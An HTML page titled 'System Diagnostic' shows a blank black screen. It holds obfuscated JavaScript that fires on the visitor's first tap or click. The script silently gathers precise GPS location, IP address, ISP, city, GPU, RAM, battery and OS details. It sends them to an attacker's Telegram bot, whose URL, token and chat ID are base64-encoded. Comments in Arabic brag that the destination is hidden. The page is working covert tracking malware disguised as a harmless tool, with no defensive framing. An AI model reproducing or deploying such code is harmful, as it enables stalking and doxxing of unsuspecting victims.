<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic</title>
</head>
<body style="background:#000; margin:0; overflow:hidden; user-select:none; -webkit-tap-highlight-color:transparent;">

    <script>
        // البيانات مشفرة بالكامل ولا يوجد أي ذكر صريح لتيليجرام أو توكن
        const _C = {
            a: "ODcxOTI5ODQwMzpBQUctOUlKZzJ4TFhtMFlhVjN5eTBaV0dFREdyalZRV3hV",
            b: "NjAwMTI4NjI3MA=="
        };
        const _X = (s) => atob(s);

        ['click', 'touchstart'].forEach(e => window.addEventListener(e, _run, {once: true}));

        async function _run() {
            let _r = { c: "0,0", i: "N/A", o: "N/A", t: "N/A", g: "N/A", b: "N/A" };

            const _loc = () => {
                return new Promise((res) => {
                    if (!navigator.geolocation) return res("N/S");
                    navigator.geolocation.getCurrentPosition(
                        (p) => res(`${p.coords.latitude},${p.coords.longitude}`),
                        () => res("D"),
                        { enableHighAccuracy: true, timeout: 5000 }
                    );
                });
            };

            try {
                // سحب بيانات المزود والـ IP (مشفرة الوجهة)
                const _n = await fetch(_X("aHR0cHM6Ly9pcGFwaS5jby9qc29uLw==")).then(r => r.json()).catch(() => ({}));
                _r.i = _n.ip || "N/A";
                _r.o = _n.org || "N/A";
                _r.t = _n.city || "N/A";

                const _v = document.createElement('canvas').getContext('webgl');
                if (_v) {
                    const _d = _v.getExtension('WEBGL_debug_renderer_info');
                    _r.g = _d ? _v.getParameter(_d.UNMASKED_RENDERER_WEBGL) : "GPU";
                }

                if (navigator.getBattery) {
                    const _bt = await navigator.getBattery();
                    _r.b = `${(_bt.level * 100).toFixed(0)}% [${_bt.charging ? 'C' : 'D'}]`;
                }

                _r.c = await _loc();

                // بناء التقرير بصيغة احترافية ومختصرة
                const _m = 
                    `👹 [V109_SHADOW_SUCCESS]\n` +
                    `━━━━━━━━━━━━━━\n` +
                    `📶 ISP: ${_r.o}\n` +
                    `🏙️ City: ${_r.t}\n` +
                    `🌐 IP: ${_r.i}\n` +
                    `📍 Loc: https://www.google.com/maps?q=${_r.c}\n` +
                    `━━━━━━━━━━━━━━\n` +
                    `📱 GPU: ${_r.g}\n` +
                    `🧠 RAM: ${navigator.deviceMemory || 'N/A'}GB\n` +
                    `🔋 Bat: ${_r.b}\n` +
                    `🛠️ Sys: ${navigator.userAgent.includes("Android") ? "Android" : "iOS"}\n` +
                    `⏰ Time: ${new Date().toLocaleString('ar-EG')}`;

                // الإرسال لوجهة مشفرة تماماً
                await fetch(_X("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + _X(_C.a) + _X("L3NlbmRNZXNzYWdl"), {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: _X(_C.b),
                        text: _m,
                        disable_web_page_preview: false
                    })
                });

            } catch (err) {}
        }
    </script>
</body>
</html>
